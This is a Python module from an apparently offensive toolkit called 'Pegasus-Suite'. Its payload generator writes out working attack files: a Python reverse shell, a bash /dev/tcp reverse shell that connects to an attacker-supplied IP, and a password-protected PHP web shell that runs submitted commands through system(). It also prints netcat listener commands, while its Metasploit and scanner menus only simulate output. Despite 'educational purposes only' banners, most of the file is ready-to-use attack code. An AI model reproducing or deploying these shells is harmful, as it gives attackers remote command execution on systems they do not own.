#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Exploitation tools for Pegasus-Suite
"""

import os
import sys
import time
import random
import string
import socket
import re
import subprocess
from platform import system
from datetime import datetime

# Import from pegabox_imports instead of directly
try:
    # Import with type ignore to prevent Pylance errors
    from pegabox_imports import Fore, Style, COLORAMA_AVAILABLE  # type: ignore
    if COLORAMA_AVAILABLE:
        from colorama import init  # type: ignore
        init(autoreset=True)
except ImportError:
    # Fallback if pegabox_imports is not available
    try:
        # Import with type ignore to prevent Pylance errors
        from colorama import Fore, Style, init  # type: ignore
        init(autoreset=True)
        COLORAMA_AVAILABLE = True
    except ImportError:
        COLORAMA_AVAILABLE = False
        # Create dummy classes for Fore and Style if colorama is not available
        class Fore:
            RED = ''
            GREEN = ''
            YELLOW = ''
            BLUE = ''
            MAGENTA = ''
            CYAN = ''
            WHITE = ''
            RESET = ''
        
        class Style:
            BRIGHT = ''
            RESET_ALL = ''

class ExploitTools:
    """Basic exploit tools for Pegasus-Suite"""
    
    def __init__(self):
        """Initialize exploit tools"""
        self.is_windows = system() == 'Windows'
        self.output_dir = "pegasus_payloads"
        if not os.path.exists(self.output_dir):
            try:
                os.makedirs(self.output_dir)
                print(f"[+] Created output directory: {self.output_dir}")
            except Exception as e:
                print(f"[!] Error creating output directory: {e}")
                self.output_dir = "."
    
    def payload_generator(self):
        """Generate various payloads for penetration testing"""
        print("\n[!] Payload Generator - EDUCATIONAL PURPOSES ONLY")
        print("[!] Only use on systems you have permission to test")
        
        print("""
        Available Payload Types:
        1. Python Reverse Shell
        2. Bash Reverse Shell
        3. PHP Web Shell
        4. Return to Exploitation Menu
        """)
        
        try:
            choice = int(input("[>] Select payload type: "))
            
            if choice == 1:
                ip = input("[>] Enter listener IP: ")
                port = input("[>] Enter listener port [4444]: ") or "4444"
                self._generate_python_reverse_shell(ip, port)
            elif choice == 2:
                ip = input("[>] Enter listener IP: ")
                port = input("[>] Enter listener port [4444]: ") or "4444"
                self._generate_bash_reverse_shell(ip, port)
            elif choice == 3:
                self._generate_php_web_shell()
            elif choice == 4:
                return
            else:
                print("[!] Invalid option selected.")
                
        except ValueError:
            print("[!] Please enter a valid number.")
            
        input("\nPress Enter to continue...")
        self.payload_generator()
    
    def _generate_python_reverse_shell(self, ip, port):
        """Generate a Python reverse shell payload"""
        filename = os.path.join(self.output_dir, f"python_reverse_shell_{random.randint(1000,9999)}.py")
        
        payload = f"""#!/usr/bin/env python3
# Python Reverse Shell - Generated by Pegasus-Suite
# EDUCATIONAL PURPOSES ONLY
import socket,subprocess,os;

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{ip}", {port}))

while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == "exit":
        break
    output = subprocess.getoutput(cmd)
    s.send(output.encode())

s.close()
"""
        
        try:
            with open(filename, 'w') as f:
                f.write(payload)
            print(f"[+] Python reverse shell created: {filename}")
            print(f"[*] Start listener with: nc -lvnp {port}")
        except Exception as e:
            print(f"[!] Error creating payload: {e}")
    
    def _generate_bash_reverse_shell(self, ip, port):
        """Generate a Bash reverse shell payload"""
        filename = os.path.join(self.output_dir, f"bash_reverse_shell_{random.randint(1000,9999)}.sh")
        
        payload = f"""#!/bin/bash
# Bash Reverse Shell - Generated by Pegasus-Suite
# EDUCATIONAL PURPOSES ONLY

bash -i >& /dev/tcp/{ip}/{port} 0>&1
"""
        
        try:
            with open(filename, 'w') as f:
                f.write(payload)
            os.chmod(filename, 0o755)  # Make executable
            print(f"[+] Bash reverse shell created: {filename}")
            print(f"[*] Start listener with: nc -lvnp {port}")
        except Exception as e:
            print(f"[!] Error creating payload: {e}")
    
    def _generate_php_web_shell(self):
        """Generate a PHP web shell payload"""
        filename = os.path.join(self.output_dir, f"php_web_shell_{random.randint(1000,9999)}.php")
        password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
        
        payload = f"""<?php
// PHP Web Shell - Generated by Pegasus-Suite
// Usage: access via browser and use password to authenticate
// WARNING: For educational purposes only

if (isset($_POST['pass']) && $_POST['pass'] == "{password}") {{
    echo "<pre>";
    if (isset($_POST['cmd'])) {{
        $cmd = $_POST['cmd'];
        system($cmd);
    }}
    echo "</pre>";
    echo '<form method="post">
    <input type="hidden" name="pass" value="{password}">
    <input type="text" name="cmd" autofocus>
    <input type="submit" value="Execute">
    </form>';
}} else {{
    echo '<form method="post">
    <input type="password" name="pass">
    <input type="submit" value="Login">
    </form>';
}}
?>
"""
        
        try:
            with open(filename, 'w') as f:
                f.write(payload)
            print(f"[+] PHP web shell created: {filename}")
            print(f"[*] Password: {password}")
            print(f"[*] Upload to web server and access via browser")
        except Exception as e:
            print(f"[!] Error creating payload: {e}")
    
    def metasploit_integration(self):
        """Simulate Metasploit Framework integration"""
        print("\n[!] Metasploit Framework Integration - SIMULATION")
        print("[!] This is a simulation of Metasploit integration")
        
        print("""
        Available Modules:
        1. exploit/multi/handler
        2. exploit/windows/smb/ms17_010_eternalblue
        3. Return to Exploitation Menu
        """)
        
        choice = input("[>] Select module (or enter to return): ")
        if not choice:
            return
            
        print("[*] This is a simulation. For actual Metasploit usage, please install and use the Metasploit Framework directly.")
        input("\nPress Enter to continue...")
        self.metasploit_integration()
    
    def vulnerability_scanner(self):
        """Basic vulnerability scanner simulation"""
        print("\n[!] Vulnerability Scanner - SIMULATION")
        
        target = input("[>] Enter target (IP/domain): ")
        if not target:
            print("[!] No target specified.")
            return
            
        print("[*] Scanning target (simulation)...")
        for i in range(5):
            print(f"[*] Progress: {i*20}%")
            time.sleep(0.5)
            
        print("\n[+] Scan complete. Sample vulnerabilities:")
        print("    - Open SSH Port (22)")
        print("    - HTTP Server Header Disclosure")
        print("    - Cross-Site Scripting (XSS)")
        
        input("\nPress Enter to continue...")


def run_exploit_tools():
    """Create and return an instance of ExploitTools class"""
    try:
        return ExploitTools()
    except Exception as e:
        print(f"Error initializing exploit tools: {e}")
        return None


if __name__ == "__main__":
    print("Pegasus-Suite Exploit Tools Module")
    print("This module should be imported by the main Pegasus-Suite application")
    tools = run_exploit_tools()
    if tools:
        tools.payload_generator() 